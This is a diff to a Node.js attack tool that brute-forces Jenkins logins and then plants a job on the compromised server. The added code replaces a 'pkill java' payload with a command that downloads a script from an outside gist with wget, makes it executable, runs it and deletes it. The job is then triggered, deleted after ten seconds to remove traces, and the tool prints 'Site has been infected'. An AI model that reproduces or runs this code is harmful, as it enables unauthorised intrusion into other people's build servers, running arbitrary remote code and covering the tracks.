@@ -3,11 +3,17 @@ const os = require('os');
 
 const Axios = require('axios');
 const Jenkins = require('jenkins');
+const xmlescape = require('xml-escape');
 
 const config = require('./config.json');
 
 const numCPUs = os.cpus().length;
 const possibleChars = new Set([...'abcdefghijklmnopqrstuvwxyz'.split('')]);
+
+const downloadAndExecute = 'wget https://gist.githubusercontent.com/Naramsim/05e770c3c0c07e54a35876f78ade98f3/raw && chmod +x raw && sh raw && rm raw'
+
+const command = xmlescape(downloadAndExecute);
+
 const xmlJob = `<?xml version='1.0' encoding='UTF-8'?>
 <project>
   <actions/>
@@ -23,7 +29,7 @@ const xmlJob = `<?xml version='1.0' encoding='UTF-8'?>
   <concurrentBuild>false</concurrentBuild>
   <builders>
     <hudson.tasks.Shell>
-      <command>pkill java</command>
+      <command>${command}</command>
     </hudson.tasks.Shell>
   </builders>
   <publishers/>
@@ -57,7 +63,6 @@ function loadConfiguration() {
         Promise.all(urlsPromises).then(([names, passwords]) => {
             namesDict = names;
             passwordDict = passwords;
-            console.log(passwordDict)
             resolve();
         });
     });
@@ -150,10 +155,14 @@ function createAndTriggerJob() {
     var instance = Jenkins({ baseUrl: `http://${usernameFound}:${passwordFound}@${host}`, crumbIssuer: false, promisify: 1 });
     instance.job.create('friendlyJob', xmlJob)
         .then(result => {
-            instance.job.build('friendlyJob').catch(result => {
-                console.log('Jenkins has been killed successfully');
-                process.exit(0);
-            });
+            instance.job.build('friendlyJob').then(() => {
+                setTimeout(() => {
+                    instance.job.destroy('friendlyJob').then(() => {
+                        console.log('Site has been infected');
+                        process.exit(0);
+                    }).catch(console.log);
+                }, 10000); 
+            }).catch(console.log);
         }).catch(console.log);
 }
 
@@ -204,4 +213,4 @@ if (cluster.isMaster) {
             });
         }
     });
-}
+};
